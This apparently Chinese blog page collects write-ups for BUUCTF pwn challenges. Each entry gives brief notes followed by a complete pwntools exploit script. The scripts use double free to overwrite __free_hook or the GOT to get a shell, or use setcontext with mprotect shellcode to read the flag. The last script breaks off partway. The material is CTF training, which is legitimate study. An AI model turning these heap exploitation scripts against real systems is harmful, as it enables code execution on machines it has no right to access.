<h3 id="rctf2018-rnote3"><a href="#rctf2018-rnote3" class="headerlink" title="rctf2018_rnote3"></a>rctf2018_rnote3</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#rctf2018_rnote3">https://buuoj.cn/challenges#rctf2018_rnote3</a><br>比较巧妙的利用<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1662519076281-3cda0727-ab5f-4629-a35b-b3148eb94932.png#averageHue=%23fdfdfd&clientId=ue6c4f275-fcec-4&from=paste&height=384&id=u12a17878&originHeight=961&originWidth=1211&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66961&status=done&style=none&taskId=u80563590-3184-4233-891d-ff79a5e5285&title=&width=484.4" alt="image.png"><br>由于ptr在下一次使用的时候没有被清零，如果我们连续两次调用free,那么下一次的ptr其实还是栈上之前保存的内容，导致double free</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#  -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">it = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./RNote3&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> <span class="keyword">in</span> libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4526A</span>, <span class="number">0x45216</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;2.27&quot;</span> <span class="keyword">in</span> libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#b *$rebase(0xF56) malloc调试</span></span><br><span class="line"><span class="comment"># b *$rebase(0x1205) flag测试</span></span><br><span class="line"><span class="comment"># b *$rebase(0x148B) free</span></span><br><span class="line"><span class="comment"># gdbscript = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     b *$rebase(0x1199)</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># db=gdb.debug(&quot;./server&quot;,gdbscript=gdbscript)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">26463</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0xCD1)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/xg $rebase(0x202040)</span></span><br><span class="line"><span class="string">    x/20xg  $rebase(0x202060)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># def debug_force():</span></span><br><span class="line"><span class="comment">#     global io</span></span><br><span class="line"><span class="comment">#     io.close()</span></span><br><span class="line"><span class="comment">#     gdbscript = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     b *$rebase(0x145F)</span></span><br><span class="line"><span class="comment">#     c</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     io=gdb.debug(elf_path,gdbscript=gdbscript)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0~0x100</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">title,size,data</span>):</span><br><span class="line">    sl( <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;please input title: &quot;</span>,title)</span><br><span class="line">    sla(<span class="string">b&quot;please input content size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&quot;please input content: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">title</span>):</span><br><span class="line">    sl(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;please input note title: &quot;</span>,title)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">title</span>):</span><br><span class="line">    sl( <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;please input note title: &quot;</span>,title)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">title,content</span>):</span><br><span class="line">    sl(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;please input note title: &quot;</span>,title)</span><br><span class="line">    sla(<span class="string">b&quot;please input new content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_str_asmencode</span>(<span class="params">content: <span class="built_in">str</span></span>):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">        out = <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    add(<span class="string">b&quot;a&quot;</span>*(i+<span class="number">1</span>),<span class="number">0x100</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;a&quot;</span>)<span class="comment">#double free</span></span><br><span class="line">add(<span class="string">b&quot;&quot;</span>,<span class="number">0x100</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;&quot;</span>,<span class="number">0x100</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;&quot;</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x4c1</span>)+<span class="string">b&quot;a&quot;</span>.ljust(<span class="number">0x17</span>,<span class="string">b&quot;\0&quot;</span>))<span class="comment">#伪造size</span></span><br><span class="line">free(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>,<span class="number">0x88</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">add(<span class="string">b&quot;a&quot;</span>,<span class="number">0x78</span>,<span class="string">b&quot;a&quot;</span>)<span class="comment">#进行构造，让他刚好道chunk的位置</span></span><br><span class="line">show(<span class="string">b&quot;aa&quot;</span>)</span><br><span class="line">ru(<span class="string">b&quot;note content: &quot;</span>)</span><br><span class="line">libc_base=u64(ru(<span class="string">b&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\0&quot;</span>))+<span class="number">0x7f5bc3347000</span>-<span class="number">0x7f5bc3732ca0</span></span><br><span class="line">free(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;c&quot;</span>)<span class="comment">#double free</span></span><br><span class="line">free_hook_addr=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">add(p32(free_hook_addr&amp;<span class="number">0xffffffff</span>)+p16((free_hook_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>),<span class="number">0x18</span>,<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">add(p32(system_addr&amp;<span class="number">0xffffffff</span>)+p16((system_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>),<span class="number">0x28</span>,<span class="string">b&quot;&quot;</span>)</span><br><span class="line">free(<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h3 id="qwb2018-slient2"><a href="#qwb2018-slient2" class="headerlink" title="qwb2018_slient2"></a>qwb2018_slient2</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#qwb2018_slient2">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>改free的got为system plt</p>
<p>额打远程需要加上sleep</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./silent2&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">28322</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xg 0x6020C0</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">#<span class="number">0x10</span>,或者<span class="number">0x80</span>以上</span><br><span class="line">def add(size,content):</span><br><span class="line">    sl(b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    s(content)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">#清零了</span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    sl(b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">#没有溢出</span><br><span class="line">ru(b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(elf.got[<span class="string">&quot;free&quot;</span>]))</span><br><span class="line">add(<span class="number">0x10</span>,b<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(elf.plt[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="meta">#debug()</span></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-nw-4"><a href="#ciscn-2019-nw-4" class="headerlink" title="ciscn_2019_nw_4"></a>ciscn_2019_nw_4</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_nw_4">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>开了沙盒，而且只能改free_hook</p>
<p>那么就直接setcontext+53加上orw+mprotect<br> 沙盒的double free,修改free_hook为setcontextt然后mrpotect然后shellcode<br> 不同版本的setcontext偏移不一样  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./ciscn_nw_4&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">27342</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *0x4009B7</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xg 0x6020C0</span></span><br><span class="line"><span class="string">    x/10xg 0x602040</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;size?\n&quot;</span>,str(size))</span><br><span class="line">    sa(b<span class="string">&quot;content?\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;index ?\n&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;index ?\n&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line">sla(b<span class="string">&quot;what is your name? \n&quot;</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x418</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))<span class="number">-0x7fa0930f4ca0</span>+<span class="number">0x7fa092d09000</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(rld().ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))<span class="number">-0x420</span>+<span class="number">0xb0</span></span><br><span class="line"><span class="meta">#rdi 0x68</span></span><br><span class="line"><span class="meta">#rsi 0x70</span></span><br><span class="line"><span class="meta">#rdx 0x88</span></span><br><span class="line"><span class="meta">#rsp 0xa0</span></span><br><span class="line"><span class="meta">#rcx 0xa8</span></span><br><span class="line">payload=b<span class="string">&quot;0&quot;</span>*<span class="number">0x68</span>+p64(heap_addr&amp;<span class="number">0xfffffffffffff000</span>)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_addr+<span class="number">8</span>)+p64(libc_base+libc.sym[<span class="string">&quot;mprotect&quot;</span>])</span><br><span class="line">shellcode=f<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">xor rsi,rsi;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rax,&#123;convert_str_asmencode(&quot;</span>flag<span class="string">&quot;)&#125;;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,2;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov rdi,rax;</span></span><br><span class="line"><span class="string">mov dl,0x40;</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov al,0;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">xor rdi,rdi;</span></span><br><span class="line"><span class="string">mov al,1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(heap_addr+<span class="number">0x10</span>)+<span class="keyword">asm</span>(shellcode)</span><br><span class="line">add(len(payload),payload)</span><br><span class="line">add(<span class="number">0x18</span>,p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">add(<span class="number">0x18</span>,b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,p64(libc_base+libc.sym[<span class="string">&quot;setcontext&quot;</span>]+<span class="number">53</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-s-2"><a href="#ciscn-2019-s-2" class="headerlink" title="ciscn_2019_s_2"></a>ciscn_2019_s_2</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_s_2">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>还不错，利用realloc构造double free</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./ciscn_s_2&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span 